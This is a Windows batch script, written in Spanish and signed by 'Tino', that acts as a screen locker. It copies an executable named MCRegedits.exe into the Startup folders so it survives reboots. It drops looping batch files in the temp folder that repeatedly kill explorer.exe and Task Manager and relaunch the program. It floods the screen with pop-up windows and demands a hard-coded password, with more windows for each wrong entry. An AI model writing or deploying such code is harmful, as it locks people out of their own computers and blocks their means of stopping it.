echo off
cls
:: EMPIEZA LA MAGIA (SCRIPTS PARA PERSISTENCIA)
SET molestorndm=%RANDOM%XXXXMadeByTinoXXXX%RANDOM%HGJT4VY3%RANDOM%%RANDOM%5BBBS%RANDOM%FV%RANDOM%XX%RANDOM%XDFT%RANDOM%BT6432C%RANDOM%FAVV%RANDOM%fsos%RANDOM%34B34B%RANDOM%DAD%RANDOM%%RANDOM%FDDD%RANDOM%FFD%RANDOM%
echo off
cls
echo :s >> %temp%\mss.bat >> %molestorndm%.bat
echo echo echo off >> %temp%\mss.bat >> %molestorndm%.bat
echo echo cls >> %temp%\mss.bat
echo echo echo INICIA SESI¢N >> %temp%\mss.bat >> %molestorndm%.bat
echo echo title INICIA SESI¢N >> %temp%\mss.bat >> %molestorndm%.bat
echo echo ping localhost -n 2 >nul >> %temp%\mss.bat >> %molestorndm%.bat
echo echo exit >> %temp%\mss.bat >> %molestorndm%.bat
echo start %temp%\mss.bat >> %molestorndm%.bat
echo ping localhost -n 4 >nul >> %molestorndm%.bat
echo goto s >> %molestorndm%.bat
start /min %temp%\%molestorndm%.bat
::::::::::::::::::::::::::::::::
:: PERSISTANCE AFTER SHUTDOWN ::
::::::::::::::::::::::::::::::::
copy MCRegedits.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
copy MCRegedits.exe C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
:::::::::
:: CIF ::
:::::::::
copy MCRegedits.exe %temp%
SET cifrandom=%random%MadeByTino%random%FF%random%FRV%random%ERVWZ%random%TYN%random%456VVV%random%ZZZEZ%random%VKJVEJJV%random%LDKIADI%random%DJDHE4H%random%3458347%random%73626%random%7235452%random%U345FCNC3%random%757HC32V23JVJ%random%U43VH23%random%
echo :cif >> %temp%\%cifrandom%.bat
echo taskkill /f /im "explorer.exe" >> %temp%\%cifrandom%.bat
echo taskkill /f /im "taskmgr.exe" >> %temp%\%cifrandom%.bat
echo echo off >> %temp%\%cifrandom%.bat
echo tasklist /FI "IMAGENAME eq MCRegedits.exe" /FO CSV > mcregedits.lmao >> %temp%\%cifrandom%.bat
echo FOR /F %%A IN (mcregedits.lmao) DO IF %%~zA EQU 0 GOTO end >> %temp%\%cifrandom%.bat
echo start MCRegedits.exe >> %temp%\%cifrandom%.bat
echo goto cif >> %temp%\%cifrandom%.bat
echo :end >> %temp%\%cifrandom%.bat
echo del mcregedits.lmao >> %temp%\%cifrandom%.bat
echo goto cif >> %temp%\%cifrandom%.bat
start /min %temp%\%cifrandom%.bat

:start
start /min %temp%\%cifrandom%.bat
start /min %temp%\%molestorndm%.bat
cls
color f0
echo ^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=
echo            Al parecer necesitas iniciar sesi¢n
echo             Usa la contrase¤a que te han dado.
echo.
echo         Si reinicias la PC o cierras el programa
echo                 va a aparecer de nuevo
echo                  Script made by Tino
echo ^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=
SET /P psw=Ingresa la contrase¤a:
IF %psw%==tino777 goto :done
) ELSE (
goto :nope

:done
cls
echo Contrase¤a correcta!
echo Felicidades.
cd %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
del MCRegedits.exe
cd %temp%
del MCRegedits.exe
cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
del MCRegedits.exe
taskkill /f /im "cmd.exe"
taskkill /f /im "MCRegedits.exe"
pause
exit

:nope
cls
echo Contrase¤a incorrecta!
echo Intentalo de nuevo
echo Mientras mas contrase¤as incorrectas, mas mensajes!
echo.
echo Presione cualquier tecla para volver al inicio
pause >nul
start %temp%\%molestorndm%.bat
goto :start
pause
